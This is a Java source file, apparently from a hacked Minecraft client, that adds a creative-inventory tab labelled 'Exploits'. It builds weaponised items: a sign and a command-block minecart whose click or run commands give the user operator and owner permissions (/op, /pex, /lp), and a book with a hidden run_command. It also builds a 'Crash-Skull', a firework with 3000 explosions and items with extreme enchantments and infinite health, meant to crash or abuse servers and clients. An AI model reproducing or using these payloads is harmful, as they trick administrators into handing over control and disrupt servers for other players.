package remix.ui.creative;

import net.minecraft.client.MinecraftClient;
import net.minecraft.creativetab.CreativeTabs;
import net.minecraft.enchantment.Enchantment;
import net.minecraft.entity.ai.attributes.AttributeModifier;
import net.minecraft.init.Blocks;
import net.minecraft.init.Items;
import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.NBTTagDouble;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.nbt.NBTUtil;
import net.minecraft.potion.Potion;
import remix.module.exploit.BookControlModule;

import com.mojang.authlib.GameProfile;
import com.mojang.authlib.properties.Property;

import java.util.Collections;
import java.util.List;
import java.util.Random;

public class CustomPotionsCreativeTab extends CreativeTabs {
    private ItemStack wZ;
    private ItemStack xa;
    private ItemStack xb;
    private ItemStack xc;
    private ItemStack xd;
    private ItemStack xe;

    private ItemStack xf;
    private static String[] packedTextFragments;

    private ItemStack xi;
    private ItemStack xj;
    private ItemStack xk;
    private static MinecraftClient xl;
    private ItemStack xm;
    private ItemStack xn;

    public void addDisplayedItems(List<ItemStack> itemStackList) {
        Blocks.method_7eec03da329a017ec143();

        if (this.xd == null) {
            this.xd = new ItemStack(Items.potionitem);
            NBTTagList nbtTagList = new NBTTagList();
            Potion[] bzT = Potion.potionTypes;
            int j = bzT.length;
            int k = 0;

            while (k < j) {
                Potion potion = bzT[k];
                if (potion != null) {
                    CompoundTag compoundTag = new CompoundTag();
                    compoundTag.setInteger("Amplifier", Integer.MAX_VALUE);
                    compoundTag.setInteger("Duration", Integer.MAX_VALUE);
                    compoundTag.setInteger("Id", potion.getId());
                    nbtTagList.appendTag(compoundTag);
                }

                k++;
            }

            this.xd.setTagInfo("CustomPotionEffects", nbtTagList);
            this.xd.setStackDisplayName("TrollPotion");
            this.xd.setItemDamage(16384);
        }

        this.xk = new ItemStack(Items.potionitem);
        NBTTagList nbtTagListValue = new NBTTagList();
        CompoundTag compoundTagValue = new CompoundTag();
        compoundTagValue.setInteger("Amplifier", 125);
        compoundTagValue.setInteger("Duration", Integer.MAX_VALUE);
        compoundTagValue.setInteger("Id", 6);
        nbtTagListValue.appendTag(compoundTagValue);
        this.xk.setTagInfo("CustomPotionEffects", nbtTagListValue);
        this.xk.setStackDisplayName("Death Potion");
        this.xk.setItemDamage(Integer.MAX_VALUE);
        if (this.xm == null) {
            this.xm = new ItemStack(Items.command_block_minecart);
            CompoundTag compoundTagValue2 = new CompoundTag();
            compoundTagValue2.setString("Command", "/op " + xl.player.getName());
            this.xm.setTag(compoundTagValue2);
        }

        if (this.xi == null) {
            this.xi = new ItemStack(Blocks.mob_spawner);
            CompoundTag compoundTagValue3 = new CompoundTag();
            new NBTTagList();
            NBTTagList nbtTagListValue2 = new NBTTagList();
            NBTTagDouble nbtTagDouble = new NBTTagDouble(0.0);
            compoundTagValue3.setString("EntityId", "FallingSand");
            nbtTagListValue2.appendTag(nbtTagDouble);
            nbtTagListValue2.appendTag(nbtTagDouble);
            nbtTagListValue2.appendTag(nbtTagDouble);
        }

        if (this.xf == null) {
            this.xf = new ItemStack(Items.written_book);
            CompoundTag compoundTagValue4 = new CompoundTag();
            NBTTagList nbtTagListValue3 = new NBTTagList();
            StringBuilder stringbuilder = new StringBuilder();
            int i1 = 0;

            while (i1 < 500) {
                stringbuilder.append(packedTextFragments[0]);
                i1++;
            }

            nbtTagListValue3.appendTag(
                    new NBTTagString(
                            String.format(
                                    "{\"clickEvent\":{\"action\":\"run_command\",\"value\":\"%s\"},\"hoverEvent\":{\"action\":\"show_text\",\"value\":{\"text\":\"%s\"}},\"text\":\"%s\"}",
                                    BookControlModule.pageClickCommand,
                                    BookControlModule.pageHoverText,
                                    BookControlModule.bookPageText + stringbuilder)));
            compoundTagValue4.setTag("pages", nbtTagListValue3);
            compoundTagValue4.setString("author", "Meep");
            compoundTagValue4.setByte("resolved", (byte) 1);
            compoundTagValue4.setString("title", "Meeps epic gamer book");
            this.xf.setTag(compoundTagValue4);
        }

        if (this.xn == null) {
            this.xn = new ItemStack(Items.sign);
            CompoundTag compoundTagValue5 = new CompoundTag();
            CompoundTag compoundTagValue6 = new CompoundTag();
            String text = packedTextFragments[1];

            String textValue3 = packedTextFragments[2];
            String textValue4 = "/pex user " + xl.player.getName() + " add *";
            String textValue5 = "/op " + xl.player.getName();
            String textValue6 = "/lp user " + xl.player.getName() + " promote Owner";
            String textValue7 = packedTextFragments[3];
            compoundTagValue6.setString(
                    "Text1",
                    "{\"text\":\"\",\"clickEvent\":{\"action\":\"run_command\",\"value\":\""
                            + textValue4
                            + "\"}}");
            compoundTagValue6.setString(
                    "Text2",
                    "{\"text\":\"Click me for\",\"clickEvent\":{\"action\":\"run_command\",\"value\":\""
                            + textValue5
                            + "\"}}");
            compoundTagValue6.setString(
                    "Text3",
                    "{\"text\":\"le-epic meme\",\"clickEvent\":{\"action\":\"run_command\",\"value\":\""
                            + textValue6
                            + "\"}}");
            compoundTagValue6.setString(
                    "Text4",
                    "{\"text\":\"\",\"clickEvent\":{\"action\":\"run_command\",\"value\":\"\"}}");
            compoundTagValue5.setTag("BlockEntityTag", compoundTagValue6);
            this.xn.setTag(compoundTagValue5);
            this.xn.setLoreLine("Place me");
        }

        if (this.xa == null) {
            this.xa = new ItemStack(Blocks.furnace);
            ItemStack itemStack = this.xa;
            CompoundTag compoundTagValue7 = new CompoundTag();
            CompoundTag compoundTagValue8 = new CompoundTag();
            NBTTagList nbtTagListValue4 = new NBTTagList();
            CompoundTag compoundTagValue9 = new CompoundTag();
            compoundTagValue9.setByte("Slot", (byte) 0);
            compoundTagValue9.setString(
                    "id", Item.itemRegistry.getNameForObject(itemStack.getItem()).toString());
            compoundTagValue9.setByte("Count", (byte) itemStack.stackSize);
            if (itemStack.hasTagCompound()) {
                compoundTagValue9.setTag("tag", itemStack.getTag());
            }

            nbtTagListValue4.appendTag(compoundTagValue9);
            compoundTagValue8.setTag("Items", nbtTagListValue4);
            compoundTagValue7.setTag("BlockEntityTag", compoundTagValue8);
            this.xa.setTag(compoundTagValue7);
            this.xa.setLoreLine("Contains the Command-Sign.");
        }

        if (this.xb == null) {
            this.xb = new ItemStack(Blocks.chest, 64);
            int l = 0;

            while (l < 4) {
                ItemStack itemStackValue = this.xb;
                CompoundTag compoundTagValue10 = new CompoundTag();
                CompoundTag compoundTagValue11 = new CompoundTag();
                NBTTagList nbtTagListValue5 = new NBTTagList();
                int k1 = 0;

                while (k1 < 27) {
                    CompoundTag compoundTagValue12 = new CompoundTag();
                    compoundTagValue12.setByte("Slot", (byte) k1);
                    compoundTagValue12.setString(
                            "id",
                            Item.itemRegistry
                                    .getNameForObject(itemStackValue.getItem())
                                    .toString());
                    compoundTagValue12.setByte("Count", (byte) itemStackValue.stackSize);
                    if (itemStackValue.hasTagCompound()) {
                        compoundTagValue12.setTag("tag", itemStackValue.getTag());
                    }

                    nbtTagListValue5.appendTag(compoundTagValue12);
                    k1++;
                }

                compoundTagValue11.setTag("Items", nbtTagListValue5);
                compoundTagValue10.setTag("BlockEntityTag", compoundTagValue11);
                this.xb.setTag(compoundTagValue10);
                l++;
            }
        }

        if (this.xe == null) {
            this.xe = new ItemStack(Items.skull, 1, 3);
            CompoundTag tag = new CompoundTag();
            CompoundTag compoundTagValue13 = new CompoundTag();
            GameProfile gameprofile = new GameProfile(null, "Crash-Skull");
            gameprofile
                    .getProperties()
                    .put(
                            "textures",
                            new Property(
                                    "Value", "eyJ0ZXh0\u00addXJlcyI6eyJTS0lOIjp7InVybCI6IiJ9fX0="));
            compoundTagValue13.setString("Id", "9d744c33-f3c4-4040-a7fc-73b47c840f0c");
            NBTUtil.writeGameProfile(compoundTagValue13, gameprofile);
            tag.setTag("SkullOwner", compoundTagValue13);
            this.xe.tag = tag;
            this.xe.setStackDisplayName("Hold me!");
        }

        if (this.wZ == null) {
            this.wZ = new ItemStack(Items.fireworks);
            Random random = new Random();
            CompoundTag compoundTagValue14 = new CompoundTag();
            NBTTagList nbtTagListValue6 = new NBTTagList();
            int j1 = 0;

            while (j1 < 3000) {
                CompoundTag compoundTagValue15 = new CompoundTag();
                compoundTagValue15.setByte("Type", (byte) (j1 % 5));
                compoundTagValue15.setBoolean("Flicker", random.nextBoolean());
                compoundTagValue15.setBoolean("Trail", random.nextBoolean());
                compoundTagValue15.setIntArray("Colors", new int[] {random.nextInt(16777215)});
                compoundTagValue15.setIntArray("FadeColors", new int[] {random.nextInt(16777215)});
                nbtTagListValue6.appendTag(compoundTagValue15);
                j1++;
            }

            compoundTagValue14.setTag("Explosions", nbtTagListValue6);
            this.wZ.setTagInfo("Fireworks", compoundTagValue14);
            this.wZ.setStackDisplayName("Infinite Firework");
        }

        if (this.xc == null) {
            this.xc = new ItemStack(Items.writable_book);
            this.xc.setStackDisplayName("\u00a7AThe Holy Bible \u00a7bv2");
            this.xc.addEnchantment(Enchantment.sharpness, 1000);
            this.xc.addEnchantment(Enchantment.looting, 1200);
            this.xc.addEnchantment(Enchantment.smite, 1000);
            this.xc.addEnchantment(Enchantment.silkTouch, 1);
            this.xc.addEnchantment(Enchantment.fortune, 100);
            this.xc.addAttributeModifier(
                    "generic.maxHealth",
                    new AttributeModifier("generic.maxHealth", Double.POSITIVE_INFINITY, 0));
            this.xc.addAttributeModifier(
                    "generic.movementSpeed",
                    new AttributeModifier("generic.movementSpeed", 0.2, 0));
        }

        if (this.xj == null) {
            this.xj = new ItemStack(Blocks.anvil);
            this.xj.setItemDamage(32767);
        }

        Collections.addAll(
                itemStackList,
                this.xd,
                this.xk,
                this.xm,
                this.xi,
                this.xf,
                this.xn,
                this.xa,
                this.xe,
                this.wZ,
                this.xc,
                this.xj,
                this.xb);
    }

    public String getTranslatedTabLabel() {
        return "Exploits";
    }

    public Item getTabIconItem() {
        return null;
    }

    private CustomPotionsCreativeTab() {
        super(12, "ExploitsTab");
    }

    public ItemStack getIconItemStack() {
        return new ItemStack(Item.getItemFromBlock(Blocks.command_block));
    }

    static {
        remix.ui.creative.CustomPotionsCreativeTab.packedTextFragments = new String[5];
        remix.ui.creative.CustomPotionsCreativeTab.packedTextFragments[0] = new String(" ");
        remix.ui.creative.CustomPotionsCreativeTab.packedTextFragments[1] = new String("");
        remix.ui.creative.CustomPotionsCreativeTab.packedTextFragments[2] = new String("");
        remix.ui.creative.CustomPotionsCreativeTab.packedTextFragments[3] = new String("");
        xl = MinecraftClient.getMinecraft();
    }
}
